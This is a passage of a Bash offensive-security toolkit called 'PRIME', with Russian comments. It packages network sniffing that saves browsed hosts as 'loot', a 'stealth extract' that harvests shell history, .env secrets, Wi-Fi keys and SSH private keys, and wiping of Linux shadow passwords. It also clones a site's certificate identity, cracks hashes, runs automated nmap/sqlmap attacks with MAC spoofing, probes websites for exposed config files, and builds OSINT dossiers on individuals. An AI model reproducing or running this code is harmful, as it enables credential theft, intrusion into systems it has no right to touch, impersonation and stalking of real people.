            tshark -i "$iface" -n -T fields -e ip.src -e ip.dst -E separator=" -> " 2>/dev/null | stdbuf -oL uniq
            ;;

        "2") # --- Data Sniffer ---
            core_engine_ui "s" "Sniffing Leads (Email/DNS/HTTP)..."
            # Перехват и Сбор трофеев [11]
            # Используем stdbuf для исключения задержек в потоке
            tshark -i "$iface" -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
            | stdbuf -oL awk NF | stdbuf -oL uniq | while read -r line; do
                echo "$line"
                core_engine_loot "traffic_leads" "$line"
            done
            ;;

        "3") # --- Traffic Record ---
            core_engine_ui "Set Record Duration:"
            core_engine_item "1" "1 Minute" "60 sec"
            core_engine_item "2" "5 Minutes" "300 sec"
            core_engine_item "3" "15 Minutes" "900 sec"
            
            local dur_choice=$(core_engine_input "select" "Select Duration")
            local duration
            case "$dur_choice" in
                1) duration=60 ;;
                2) duration=300 ;;
                3) duration=900 ;;
                *) duration=60 ;;
            esac
            
            local filename="${BASE_DIR:-./}/prime_loot/capture_$(date +%H%M).pcap"
            core_engine_ui "w" "Recording to $(basename "$filename") ($duration sec)..."
            
            # Запуск записи через Глушитель
            tshark -i "$iface" -a duration:"$duration" -w "$filename" 2>/dev/null
            
            # Валидация результата через Мозг [5]
            if core_engine_validator "file" "$filename" "PCAP Archive"; then
                core_engine_ui "+" "Capture saved to loot directory."
            fi
            ;;
    esac

    core_engine_wait
}


run_deep_bridge() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME BRIDGE: NEURAL INTELLIGENCE LINK"
    
    # Пути согласно твоей структуре (используем BASE_DIR для гибкости)
    local loot_dir="${BASE_DIR:-./}/prime_loot"
    local pool="/tmp/bridge_pool.tmp"
    local master_loot="$loot_dir/master_intelligence.log"
    
    # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (Стерилизация) ---
    # Собираем данные из всех модулей через Глушитель [7]
    # Используем твой принцип Банковского Гамбита — только чистые данные
    sort -u "$loot_dir"/*.log "$master_loot" 2>/dev/null | grep -v '^$' > "$pool"
    
    # Проверка через Валидатор [5] без лишних IF
    [[ ! -s "$pool" ]] && { core_engine_ui "w" "Awaiting intelligence signals..."; core_engine_wait; return; }

    core_engine_ui "i" "Analyzing $(wc -l < "$pool") intelligence threads..."
    core_engine_wait "L" # Разделительная линия [9]

    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ---
    while read -r line; do
        # Извлекаем данные, очищая от шума через xargs
        local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
        local len="${#raw_data}"

        # 1. Детекция Крипто-сигнатур (Хеши)
        if [[ "$len" =~ ^(32|40|64|60)$ ]]; then
            core_engine_ui "y" "RESONANCE: Possible Hash Artifact ($len chars)"
            # Здесь будет мост к run_pass_lab
        fi

        # 2. Детекция Банковских Сигнатур (IBAN) — Твоя защита Гамбита
        if [[ "$raw_data" =~ ^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30} ]]; then
            core_engine_ui "y" "RESONANCE: Financial Asset (IBAN) detected"
        fi

        # 3. Семантические Маркеры (Доступы) через Нейро-мутатор [4]
        if echo "$raw_data" | grep -qiE "pass|secret|key|token|auth|admin"; then
            core_engine_ui "w" "RESONANCE: Identity Leak detected"
        fi

        # 4. Детекция Скрытых Сетей (Onion/I2P)
        if [[ "$raw_data" =~ \.(onion|i2p) ]]; then
            core_engine_ui "r" "RESONANCE: Dark Web Gateway found"
        fi

    done < "$pool"

    # --- СЛОЙ 3: ОЧИСТКА ТРЕКА через Санитара [8] ---
    core_engine_remove "$pool"
    core_engine_wait "L"
    core_engine_ui "i" "Intelligence synchronization complete"
    core_engine_wait
}

suggest_action() {
    local func=$1
    local data=$2
    
    # Слой 1: Визуальный резонанс через Голос [1]
    # Показываем только первые 15 символов данных для чистоты экрана
    local preview="${data:0:15}..."
    
    # Слой 2: Запрос через Органы чувств [3] и Валидатор [5]
    # Используем желтый акцент для данных и белый для функции
    echo -en "${B}>>> Intelligence suggests ${W}$func${B} for: ${Y}$preview${NC} | "
    
    if core_engine_validator "read" "Execute?"; then
        # Слой 3: Исполнение через Глушитель [7]
        core_engine_ui "i" "Executing linked action: $func"
        $func "$data"
    else
        core_engine_ui "i" "Action bypassed. Data indexed."
    fi
}

run_smart_osint_engine() {
    clear
    core_engine_ui "h" "PRIME RECON: ULTIMATE OSINT CORE v13.8"

    # Ввод через стандартный input Ядра
    local INPUT=$(core_engine_input "text" "TARGET (Nick, Phone, or Email)")
    [[ -z "$INPUT" ]] && return

    local raw_log="/tmp/prime_recon_$RANDOM.log"
    local UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    
    # Используем новый однострочный прогресс
    core_engine_progress 2 "OSINT_SCAN_INIT"

    # --- 1. ОПРЕДЕЛЕНИЕ ТИПА ЦЕЛИ ---
    local is_email="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$"
    local is_phone="^\+?[0-9]{10,15}$"

    # --- 2. SOCIAL SCAN ---
    if [[ ! "$INPUT" =~ $is_email && ! "$INPUT" =~ $is_phone ]]; then
        core_engine_ui "i" "Scanning Social Signatures (Ghost Mode)..."
        local sites=(
            "https://github.com/|GitHub"
            "https://twitter.com/|Twitter"
            "https://instagram.com/|Instagram"
            "https://vk.com/|VK"
            "https://t.me/|Telegram"
            "https://ok.ru/|Odnoklassniki"
            "https://www.pinterest.com/|Pinterest"
            "https://www.reddit.com/user/|Reddit"
        )

        for entry in "${sites[@]}"; do
            local url="${entry%%|*}"
            local name="${entry##*|}"
            local status=$(curl -s -o /dev/null -L -w "%{http_code}" -A "$UA" "${url}${INPUT}" --connect-timeout 5)
            if [ "$status" == "200" ]; then
                echo "[+] FOUND on $name: ${url}${INPUT}" >> "$raw_log"
                core_engine_ui "s" "Match confirmed: $name"
            fi
        done
    fi

    # --- 3. PHONE INTEL ---
    if [[ "$INPUT" =~ $is_phone ]]; then
        core_engine_ui "i" "Deep-Querying Global Phone Databases..."
        curl -s "https://htmlweb.ru/geo/api.php?json&telcod=${INPUT}" >> "$raw_log" 2>/dev/null
        local phone_info=$(grep -oE '"name":"[^"]+"|"oper":"[^"]+"' "$raw_log" | sed 's/"//g')
        [[ -n "$phone_info" ]] && core_engine_ui "s" "Operator Data: $phone_info"
    fi

    # --- 4. DATA BREACH ANALYZER ---
    if [[ "$INPUT" =~ $is_email ]]; then
        core_engine_ui "i" "Cross-referencing Leak Databases..."
        curl -s "https://api.proxynova.com/comb?query=${INPUT}" >> "$raw_log" 2>/dev/null
        if grep -q "results" "$raw_log"; then
            core_engine_ui "w" "Breach Detected: Target found in global COMB leak."
            echo "[!] WARNING: Data leak detected for $INPUT" >> "$raw_log"
        fi
    fi

    # --- 5. ГЕНЕРАЦИЯ ФИНАЛЬНОГО ДОСЬЕ ---
    core_engine_ui "line" ""
    core_engine_ui "s" "INTELLIGENCE DOSSIER GENERATED"
    core_engine_ui "line" ""
    
    local hits=$(grep -cE "FOUND|!|oper" "$raw_log" 2>/dev/null || echo 0)
    echo -e "${B}Target Identification:${NC} $INPUT"
    echo -e "${Y}Correlation Level:${NC} $hits matches found."
    
    echo -e "\n${G}--- DETAILED FINDINGS ---${NC}"
    if [ -f "$raw_log" ]; then
        grep -E "FOUND|oper|name|location|WARNING" "$raw_log" | sort -u
    else
        echo -e "${R}No data collected.${NC}"
    fi
    
    # Логирование через новый движок
    core_engine_loot "osint" "Dossier for $INPUT created. Hits: $hits"
    rm -f "$raw_log"
    core_engine_ui "line" ""

    # Заменяем старую pause на новый wait
    core_engine_wait
}



run_pc_recovery_ultimate() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "RECOVERY & FORENSIC ENGINE"

    # Слой 2: Архитектор [2] и Органы чувств [3]
    core_engine_item "1" "Stealth Extract" "Prime_Extract v1.0"
    core_engine_item "2" "Smart Password Reset" "Win/Lin/Mac"
    core_engine_item "B" "Back" "Return to Main Menu"

    local choice=$(core_engine_input "select" "Select Forensic Action")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1") # --- Stealth Extract ---
            core_engine_ui "i" "Инициализация PRIME_EXTRACT v1.0..."
            core_engine_progress 2 "SCANNING SYSTEM ARTIFACTS"
            
            # Временный буфер для захвата данных
            local buffer=""
            
            # 1. Анализ истории (Bash/Zsh) через Глушитель [7]
            core_engine_ui "!" "Analyzing Command History..."
            local hist=$(grep -hE "pass|pwd|user|admin|login|mysql|ssh" /home/*/.{bash,zsh}_history 2>/dev/null)
            
            # 2. Поиск конфигов и .env
            core_engine_ui "!" "Scanning Configs & .env files..."
            local configs=$(find /home /var/www /etc -maxdepth 4 \( -name ".env" -o -name "config.php" -o -name "settings.py" \) 2>/dev/null | xargs grep -hE "DB_|PASS|KEY|TOKEN" 2>/dev/null)

            # 3. Wi-Fi профили (Сетевые доступы)
            local wifi=""
            [[ -d "/etc/NetworkManager/system-connections" ]] && wifi=$(grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null)

            # 4. SSH Ключи
            core_engine_ui "!" "Locating SSH Private Keys..."
            local ssh_keys=$(find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null)

            # Слой 3: Сбор трофеев через узел [11]
            buffer="Host: $(hostname)\nHistory:\n$hist\nConfigs:\n$configs\nWiFi:\n$wifi\nSSH:\n$ssh_keys"
            core_engine_loot "forensic" "$buffer"
            
            core_engine_ui "+" "Extraction Complete. No Python/LaZagne traces left."
            ;;

        "2") # --- Smart Password Reset ---
            core_engine_ui "i" "Detecting Target Environment..."
            
            # Поиск Windows SAM через Мозг [5]
            local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
            
            if [[ -n "$win_sam" ]]; then
                core_engine_ui "+" "Windows SAM detected: $win_sam"
                core_engine_validator "pkg" "chntpw" "CHNTPW" && chntpw -i "$win_sam"
            else
                # Блок Unix (Определение OS через Метрики [12])
                local os_t="Linux"
                [[ "$(uname)" == "Darwin" ]] && os_t="macOS"
                core_engine_ui "i" "OS: $os_t detected."

                local users
                if [[ "$os_t" == "macOS" ]]; then
                    users=$(dscl . list /Users | grep -v '^_\|root')
                else
                    users=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
                fi
                
                [[ -z "$users" ]] && { core_engine_ui "e" "No local users found."; core_engine_wait; return; }

                # Динамическое меню выбора пользователя
                for u in $users; do core_engine_item "$u" "$u" "Local User"; done
                local t_user=$(core_engine_input "select" "Select Target User")
                
                [[ -n "$t_user" && "$t_user" != "b" ]] && {
                    if [[ "$os_t" == "Linux" ]]; then
                        core_engine_ui "!" "Wiping password for $t_user..."
                        # Атомарная правка через Санитара [8]
                        core_engine_run "sed -i 's/^$t_user:[^:]*:/$t_user::/' /etc/shadow" "Wiping shadow password"
                        core_engine_ui "+" "Linux password wiped (Empty Login enabled)."
                    elif [[ "$os_t" == "macOS" ]]; then
                        local np=$(core_engine_input "text" "Enter New Password")
                        core_engine_run "sudo dscl . -passwd /Users/$t_user $np" "Updating macOS password"
                        core_engine_ui "+" "macOS password updated."
                    fi
                }
            fi
            ;;
    esac
    core_engine_wait
}


run_crypto_forge() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME CRYPTO-FORGE & MIRROR v12.0"

    # Слой 2: Валидация OpenSSL через Мозг [5]
    core_engine_validator "pkg" "openssl" "OpenSSL Core" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Прием цели
    local target=$(core_engine_input "text" "Enter Target (Domain, IP, File or 'new')")
    [[ -z "$target" ]] && return

    local tmp_data="/tmp/forge_$(date +%s).tmp"
    
    # --- СЛОЙ 4: ЭВРИСТИЧЕСКИЙ ЗАХВАТ (Analysis) ---
    core_engine_ui "i" "Ingesting cryptographic signals..."

    # Попытка захвата DNA через Глушитель [7]
    if [[ "$target" != "new" ]]; then
        { cat "$target" 2>/dev/null || \
          timeout 5 openssl s_client -connect "${target}:443" -servername "$target" </dev/null 2>/dev/null | openssl x509; \
        } > "$tmp_data" 2>/dev/null
    fi

    # --- СЛОЙ 5: АВТОМАТИЧЕСКИЙ ВЫБОР РЕЖИМА ---
    local mode="CREATE"
    [[ -s "$tmp_data" ]] && mode="MIRROR"
    core_engine_ui "s" "Mode Identified: $mode"

    local subj algo opt
    case "$mode" in
        "MIRROR")
            core_engine_ui "w" "Cloning target DNA for $target..."
            local cert_text=$(openssl x509 -in "$tmp_data" -text -noout)
            subj=$(echo "$cert_text" | grep "subject=" | sed 's/^subject= //; s/^subject=//')
            # Эвристика алгоритма
            if echo "$cert_text" | grep -qiE "RSA.*(2048|4096)"; then
                algo="rsa:2048"
                opt=""
            else
                algo="ec"
                opt="-pkeyopt ec_paramgen_curve:prime256v1"
            fi
            ;;
        "CREATE")
            core_engine_ui "i" "Initializing fresh identity Forge..."
            subj="/C=US/O=Prime_Intelligence/CN=${target:-prime.local}"
            algo="rsa:2048"
            opt=""
            ;;
    esac

    # --- СЛОЙ 6: ЕДИНАЯ КОВКА (Unified Forge) ---
    local loot_dir="${BASE_DIR:-./}/prime_loot"
    local safe_name=$(echo "$target" | tr '.' '_')
    local out_base="$loot_dir/${safe_name}_forge"
    
    # Генерация через Глушитель [7]
    if openssl req -x509 -newkey "$algo" $opt -nodes -days 365 \
        -subj "$subj" -keyout "${out_base}.key" -out "${out_base}.crt" 2>/dev/null; then
        
        # Стелс-зачистка через Санитара [8] (удаление меток инструмента)
        sed -i '/OpenSSL/d' "${out_base}.crt" 2>/dev/null
        
        core_engine_ui "+" "Cryptographic Artifact Synthesized."
        echo -e "${W}Key: ${out_base}.key\nCrt: ${out_base}.crt${NC}"
        
        # Сбор трофеев [11] и сигнал для Моста [10]
        core_engine_loot "crypto" "Generated $mode certificate for $target (Algo: $algo)"
        echo "[$(date)] CRYPTO_FORGE: $mode Success | Target: $target" >> "$loot_dir/bridge_signals.log"
    else
        core_engine_ui "e" "Forge rejected the sequence."
    fi

    # Очистка через Санитара [8]
    core_engine_remove "$tmp_data"
    core_engine_wait
}


run_pass_lab() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME PASSWORD LABORATORY v13.8"

    local target_hash="$1"
    local choice

    # Слой 2: Органы чувств [3] — Определение режима
    if [[ -z "$target_hash" ]]; then
        core_engine_item "1" "GENERATE" "Create Secure Password"
        core_engine_item "2" "CRUNCH" "Wordlist Generator"
        core_engine_item "3" "DECRYPT" "Hash Cracking"
        core_engine_item "B" "BACK" "Return"
        choice=$(core_engine_input "select" "Select Operation Mode")
    else
        # Если данные пришли из Bridge, сразу переходим к дешифровке
        choice="3"
        core_engine_ui "i" "Hash signal received from Bridge. Initializing Decryptor..."
    fi

    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1") # --- ВЕТКА GENERATE ---
            core_engine_item "1" "PHONETIC" "Easy to remember (pwgen)"
            core_engine_item "2" "COMPLEX" "Maximum entropy (urandom)"
            local g_mode=$(core_engine_input "select" "Generation Type")

            local len=$(core_engine_input "text" "Enter Length (Default: 16)")
            len=${len:-16}
            
            local pass=""
            if [[ "$g_mode" == "1" ]]; then
                # Проверка наличия pwgen через Мозг [5]
                core_engine_validator "pkg" "pwgen" "pwgen" && pass=$(pwgen -s "$len" 1)
            else
                pass=$(tr -dc 'A-Za-z0-9!@#$%^&*()_+=' < /dev/urandom | head -c "$len")
            fi

            core_engine_ui "+" "ARTIFACT GENERATED"
            echo -e "${W}Password: ${Y}$pass${NC}"
            
            # Мутация через Мозг [5]
            if core_engine_validator "read" "Apply Bcrypt mutation?"; then
                local b_hash=$(echo -n "$pass" | mkpasswd -m bcrypt -s 2>/dev/null || echo "Error: mkpasswd missing")
                echo -e "${G}Bcrypt Hash: ${NC}$b_hash"
                core_engine_loot "pass_gen" "Pass: $pass | Hash: $b_hash"
            fi
            ;;

        "2") # --- ВЕТКА CRUNCH ---
            # Валидация Crunch через Мозг [5]
            core_engine_validator "pkg" "crunch" "Crunch" || { core_engine_wait; return; }
            
            core_engine_ui "i" "Crunch Syntax: [min] [max] [charset]"
            local c_params=$(core_engine_input "text" "Enter Parameters (e.g., 4 6 abc12)")
            [[ -z "$c_params" ]] && return
            
            local out_file="${BASE_DIR:-./}/prime_loot/wordlist_$(date +%s).txt"
            core_engine_ui "w" "Generating wordlist to: $(basename "$out_file")"
            
            # Исполнение через Глушитель [7]
            core_engine_run "crunch $c_params -o $out_file" "Crunching Entropy"
            core_engine_ui "+" "Done. Signals saved to loot."
            ;;

        "3") # --- ВЕТКА DECRYPT (Интеграция с John) ---
            local hash_to_crack="${target_hash:-$(core_engine_input "text" "Enter Hash to Decrypt")}"
            [[ -z "$hash_to_crack" ]] && return
            
            core_engine_ui "!" "Initializing John the Ripper Engine..."
            # Сохраняем хеш во временный файл через Санитара [8]
            local tmp_h="/tmp/h_$(date +%s)"
            echo "$hash_to_crack" > "$tmp_h"
            
            # Проверка John через Мозг [5]
            if core_engine_validator "pkg" "john" "John the Ripper"; then
                core_engine_run "john $tmp_h" "Cracking Sequence"
                local result=$(john --show "$tmp_h" | head -n 1)
                
                core_engine_ui "+" "Cracking Cycle Finished."
                echo -e "${W}Result: ${Y}${result:-No match found}${NC}"
                
                [[ -n "$result" ]] && core_engine_loot "cracked_hashes" "Hash: $hash_to_crack | Result: $result"
            fi
            core_engine_remove "$tmp_h"
            ;;
    esac

    core_engine_wait
}


run_prime_exploiter_v5() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME HEURISTIC VULN-SCANNER v7.0"

    # Слой 2: Органы чувств [3] — Прием цели
    local target=$(core_engine_input "text" "Enter Target Domain/URL")
    [[ -z "$target" ]] && return

    # Подготовка путей согласно архитектуре [8]
    local loot_dir="${BASE_DIR:-./}/prime_loot"
    local results_file="$loot_dir/vuln_$(date +%s).log"
    local signals_file="/tmp/signals_$RANDOM.tmp"
    
    # --- СЛОЙ 1: ПАССИВНЫЙ ГЕНЕРАТОР СИГНАЛОВ ---
    core_engine_ui "i" "Ingesting target aura (Passive Mode)..."
    
    # Сбор данных через Глушитель [7]
    {
        curl -Is --connect-timeout 5 -A "Mozilla/5.0 (compatible; Googlebot/2.1)" "$target"
        host -t txt "$target" 2>/dev/null
        whois "$target" 2>/dev/null | grep -iE "city|country|orgname"
    } > "$signals_file" 2>&1

    # --- СЛОЙ 2: АДАПТИВНАЯ МАТРИЦА (Мозг [5]) ---
    # Оценка сложности через Метрики [12]
    local entropy_level=$(wc -c < "$signals_file")
    local stealth_delay=$(( (entropy_level % 5) + 2 ))
    
    # Эвристический выбор модулей
    local sql_engine="dormant"
    grep -qiE "php|db|sql|id=" "$signals_file" && sql_engine="active"
    
    local scan_intensity="-T3"
    grep -qiE "cloudflare|akamai|sucuri" "$signals_file" && scan_intensity="-T1 --spoof-mac 0"

    # --- СЛОЙ 3: ЦИКЛ АМОРФНОГО ИСПОЛНЕНИЯ ---
    core_engine_ui "w" "Deploying Ghost-Engine (Intensity: $scan_intensity)..."

    # Запускаем фоновый процесс через Санитара [8]
    (
        nmap $scan_intensity -n -Pn --version-intensity 0 "$target" >> "$results_file" 2>&1
        
        if [[ "$sql_engine" == "active" ]]; then
            # Адаптивный вызов sqlmap через Глушитель
            sqlmap -u "$target" --batch --random-agent --delay="$stealth_delay" \
                  --threads=1 >> "$results_file" 2>&1
        fi
    ) &

    # Визуализация прогресса через Синхронизацию [13]
    core_engine_progress 10 "Processing heuristic feedback loops"

    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
    core_engine_wait "L"
    core_engine_ui "s" "INTELLIGENCE SYNTHESIS COMPLETE"
    
    # Парсинг результатов через Валидатор [5]
    if [[ -s "$results_file" ]]; then
        grep -Ei "critical|vulnerable|payload|exploit|dbms|open" "$results_file" | \
        sed -r "s/(.*vulnerable.*)/\1 ${Y}[HIGH PRIORITY]${NC}/" | sort -u
        
        # Интеграция в Сборщик трофеев [11]
        core_engine_loot "vulnerabilities" "Target: $target | Entropy: $entropy_level\n$(cat "$results_file")"
    else
        core_engine_ui "e" "No significant anomalies detected in initial scan."
    fi

    # Сигнал для Моста [10]
    echo "[$(date)] VULN_SCAN: $target | ENTROPY: $entropy_level" >> "$loot_dir/bridge_signals.log"
    
    # Очистка через Санитара [8]
    core_engine_remove "$signals_file"
    core_engine_wait
}



# --- PRIME OMEGA AUDITOR v2.5 [GHOST_SPEED] ---
# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ГЛУБОКОГО АНАЛИЗА ---
run_deep_file_probe() {
    local host="$1"
    local target_file="$2"
    [[ -z "$host" || -z "$target_file" ]] && return

    core_engine_ui "i" "Deep Probing: $target_file..."
    
    # Загружаем заголовок файла (первые 2кб достаточно для анализа логики)
    local sample=$(curl -s -k -L --max-time 5 "https://$host/$target_file" | head -c 2048)
    local leaks=""

    # Эвристика: поиск паттернов уязвимостей
    echo "$sample" | grep -qiE "mysqli_connect|PDO\(|db_password|db_user|root" && leaks+="${R}[!] DB_LEAK: Connection string detected${NC}\n"
    echo "$sample" | grep -qiE "POST\[|GET\[|REQUEST\[" && leaks+="${Y}[*] LOGIC: Entry point for data detected${NC}\n"
    echo "$sample" | grep -qiE "exec\(|system\(|passthru\(" && leaks+="${R}[!] RCE_RISK: System command execution${NC}\n"
    echo "$sample" | grep -qiE "fopen\(|file_get_contents\(" && leaks+="${B}[i] LFI_RISK: File operations detected${NC}\n"

    if [[ -n "$leaks" ]]; then
        echo -e "      |--- ANALYSIS:\n$(echo -e "$leaks" | sed 's/^/      | /')"
        # Сохраняем "грязный" файл в лут для ручного разбора
        echo "$sample" > "$PRIME_LOOT/probe_${target_file//\//_}_$(date +%s).php"
    fi
}

# --- ОСНОВНОЙ АУДИТОР ---
run_prime_auditor_v2() {
    local host="$1"
    core_engine_ui "h" "OMEGA AUDITOR v5.1 (Deep Probe / Parallel)"

    # 1. ПОЛУЧЕНИЕ ЦЕЛИ
    if [[ -z "$host" ]]; then
        host=$(core_engine_input "text" "Enter Target (Domain or IP)")
    fi
    [[ -z "$host" ]] && return

    # 2. ЭВРИСТИКА БЕЗОПАСНОСТИ
    if [[ "$host" =~ ^(127\.|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|localhost) ]]; then
        core_engine_ui "i" "Local target detected. Skipping Anonymity Check."
    else
        core_engine_validator "privacy" "" "Security Shield" || return
    fi

    # 3. ВАЛИДАЦИЯ
    core_engine_validator "url" "$host" "Syntax" || return
    core_engine_validator "net_up" "$host" "Availability" || return

    # 4. ПАРАЛЛЕЛЬНЫЙ ДВИЖОК
    local tmp_pipe="/tmp/prime_pipe_$$"
    local vuln_links=""
    touch "$tmp_pipe"

    core_engine_ui "i" "Deploying Parallel Engines on: $host"

    ( # Поток А: Краулинг контента
        local discovered=$(curl -s -k -L --max-time 5 "https://$host" | grep -oE '[a-zA-Z0-9_\/\.-]+\.(php|pdf|docx|xlsx|zip|sql|env|htaccess)' | sort -u)
        for t in $discovered; do echo "HIT|$t" >> "$tmp_pipe"; done
    ) &

    ( # Поток Б: Скрытые директории/файлы
        local fuzz=(".env" ".htaccess" "backup.sql" "config.php.bak" ".git/config" "phpinfo.php" "wp-config.php" "config.php")
        for f in "${fuzz[@]}"; do
            local res=$(curl -s -k -L -I -w "%{http_code}" -o /dev/null --connect-timeout 3 "https://$host/$f")
            [[ "$res" == "200" ]] && echo "HIT|$f" >> "$tmp_pipe"
        done
    ) &

    wait
    
    # 5. ИНТЕЛЛЕКТУАЛЬНЫЙ ЛУТИНГ + DEEP PROBE
    core_engine_ui "line"
    echo -e "${Y}>>> AUDIT REPORT: $host <<<${NC}"

    while IFS='|' read -r type target; do
        # Быстрая проверка на мусор хостинга
        local head_check=$(curl -s -k -L --max-time 3 "https://$host/$target" | head -c 500)
        if ! echo "$head_check" | grep -qiE "<html>|403 Forbidden|InfinityFree|Not Found"; then
            
            # Классификация
            if echo "$target" | grep -qiE "\.(env|sql|bak|htaccess)"; then
                core_engine_loot "CRITICAL" "Exposed: $target on $host"
                echo -e "${R}[CRITICAL]${NC} $target"
            else
                echo -e "${G}[FILE]${NC} $target"
            fi

            # --- ЭВРИСТИЧЕСКИЙ ВЫЗОВ DEEP PROBE ---
            # Если файл PHP и имеет подозрительное имя — вскрываем немедленно
            if echo "$target" | grep -qiE "\.php$" && echo "$target" | grep -qiE "log|pass|recup|config|admin|db|setup"; then
                run_deep_file_probe "$host" "$target"
            fi
        fi
    done < <(sort -u "$tmp_pipe")

    rm -f "$tmp_pipe"
    core_engine_ui "line"
    core_engine_wait
}

run_omni_scan() {
    core_engine_ui "h" "OMNI-SCAN ENGINE v1.0 (Autonomous Orchestrator)"

    # Слой 1: Безопасность
    core_engine_validator "privacy" "" "Anonymity Check" || return

    # Слой 2: Ввод
    local target_host=$(core_engine_input "text" "Enter Target Host")
    [[ -z "$target_host" ]] && return

    # Слой 3: Предварительная проверка
    core_engine_validator "url" "$target_host" "Syntax Check" || return
    core_engine_validator "net_up" "$target_host" "Availability Check" || return

    core_engine_ui "i" "All checks passed. Deploying Parallel Auditor..."
    
    # ПЕРЕДАЧА ХОСТА В АУДИТОР
    run_prime_auditor_v2 "$target_host"
}



run_view_loot() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "DATA HARVESTER: INTELLIGENT LOOT VIEW"

    # Слой 2: Органы чувств [3] — Определение путей
    local base_loot="${BASE_DIR:-./}/prime_loot"
    
    # Поиск артефактов через Санитара [8]
    local found_files=$(find "$base_loot" -maxdepth 1 -type f -size +1c 2>/dev/null)
    local found_count=0

    if [[ -n "$found_files" ]]; then
        for file in $found_files; do
            ((found_count++))
            
            # Слой 3: Аналитика и визуализация
            core_engine_ui "s" "ANALYZING ARTEFACT: $(basename "$file")"
            echo -e "${D}--------------------------------------------------${NC}"
            
            # Интеллектуальный парсинг контента через Глушитель [7]:
            # 1. IP-адреса -> Циан (C)
            # 2. Password/Key -> Желтый (Y)
            # 3. Payload/Success -> Зеленый (G)
            
            tail -n 30 "$file" | sed \
                -e "s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}/${C}&${NC}/g" \
                -e "s/Password[:=]\(.*\)/${Y}&${NC}/g" \
                -e "s/BRUTE_SUCCESS\(.*\)/${G}&${NC}/g" \
                -e "s/EXPLOIT_SUCCESS\(.*\)/${G}&${NC}/g" \
                -e "s/Payload[:=]\(.*\)/${G}&${NC}/g"
            
            echo -e "\n${D}--------------------------------------------------${NC}"
        done
    else
        core_engine_ui "e" "No data found in $base_loot"
    fi

    # Слой 4: Синхронизация [13]
    core_engine_wait
}

run_iban_analyzer() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "FINANCIAL INTELLIGENCE: OMNI-BANKER v2.2"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Выбор вектора
    core_engine_item "1" "SINGLE" "Full IBAN & Holder Analysis"
    core_engine_item "2" "PASSIVE" "Structural Validation Only"
    core_engine_item "B" "BACK" "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Select Operation Vector")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    # Слой 4: Подготовка временного движка (Санитар [8])
    local engine_path="/tmp/iban_engine_$(date +%s).py"
    
    # Генерация кода (внутренняя функция системы)
    if command -v generate_iban_code >/dev/null; then
        generate_iban_code "$engine_path" "2.2"
    else
        # Заглушка, если генератор еще не подточен
        core_engine_ui "e" "IBAN Engine Generator not found."
        return
    fi

    # Слой 5: Исполнение через Глушитель [7]
    case "$choice" in
        "1")
            local target_iban=$(core_engine_input "text" "Enter IBAN to validate (e.g., FR76...)")
            [[ -z "$target_iban" ]] && { core_engine_remove "$engine_path"; return; }

            local expected_name=$(core_engine_input "text" "Enter Expected Holder Name (Optional/none)")
            
            core_engine_ui "i" "Executing Full Intelligence Cycle..."
            python3 "$engine_path" "$target_iban" "${expected_name:-none}"
            
            # Сбор трофеев [11]
            core_engine_loot "financial" "Full Scan: ${target_iban:0:4}****"
            ;;

        "2")
            local target_iban=$(core_engine_input "text" "Enter IBAN for Structural Check")
            [[ -z "$target_iban" ]] && { core_engine_remove "$engine_path"; return; }

            core_engine_ui "i" "Executing Passive Structural Validation..."
            python3 "$engine_path" "$target_iban" "none"
            
            core_engine_loot "financial" "Passive Check: ${target_iban:0:4}****"
            ;;
    esac

    # Слой 6: Стерилизация и Финализация [8]
    local res_status=$?
    core_engine_remove "$engine_path"
    
    if [[ $res_status -eq 0 ]]; then
        core_engine_ui "s" "Analysis complete. Trace purged."
    else
        core_engine_ui "e" "Analysis interrupted or invalid IBAN format."
    fi

    core_engine_wait
}





# --- Server Generating---

# --- PRIME IGNITION: RUN WITHOUT FILES ---

run_live_service() {
    local service_type="$1"
    local port="${2:-8080}"
    local log_file="$HOME/prime_node.log"
    local cert_file="$HOME/prime_node.pem"
    local protocol="http"

    core_engine_ui "h" "PRIME LIVE NODE: ${service_type^^}"

    # --- 1. АДАПТИВНЫЙ DNS & IP ---
    # Вызываем синхронизацию (она сама найдет лучший IP и обновит dnsmasq)
    core_network_dns_sync || core_engine_ui "w" "DNS Sync bypassed, using raw IP."
    
    # Эвристика имени: выбираем домен на основе типа сервиса
    local service_name="prime.portal"
    [[ "$service_type" == "av" ]] && service_name="scanclamavlocal"

    # --- 2. ЭВРИСТИКА ПРОТОКОЛА (SSL Check) ---
    if command -v openssl >/dev/null 2>&1; then
